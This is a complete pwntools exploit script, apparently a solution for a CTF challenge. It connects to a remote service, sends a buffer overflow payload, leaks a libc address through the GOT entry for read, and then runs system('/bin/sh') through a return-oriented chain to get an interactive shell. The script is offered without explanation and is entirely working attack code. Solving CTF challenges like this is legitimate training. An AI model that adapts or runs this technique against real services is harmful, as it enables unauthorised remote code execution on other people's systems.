from pwn import *

BEDUG = False

elf = ELF('./A')
libc = ELF('./libc-2.34.so')

if (BEDUG == True):
    io = process('./A')
    gdb.attach(io)
else:
    io = remote('skilltest.nc.jctf.pro', 1337)

payload = b'A'*0x28+p64(0x3ff000)+b'A'*0x10+p64(0x3ff000)+p64(0x4018dc)+p64(elf.got['read'])

pause()
io.sendafter(b'Nick: ', payload)
io.sendafter(b'Clan tag: ', p64(0x3fe500)+p64(0x4013ef)+p64(0x4018e0))

io.recvuntil(b'Thanks\n')
libc.address = u64(io.recv(6)+b'\0\0') - 0x113920
log.info('Libc: '+hex(libc.address))
payload = b'A'*0x28+p64(0x3fefd8)
io.sendafter(b'Nick: ', payload)

io.sendafter(b'Clan tag: ', p64(0x40101a)+p64(libc.address+0x2a6c5)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system']))


io.interactive()
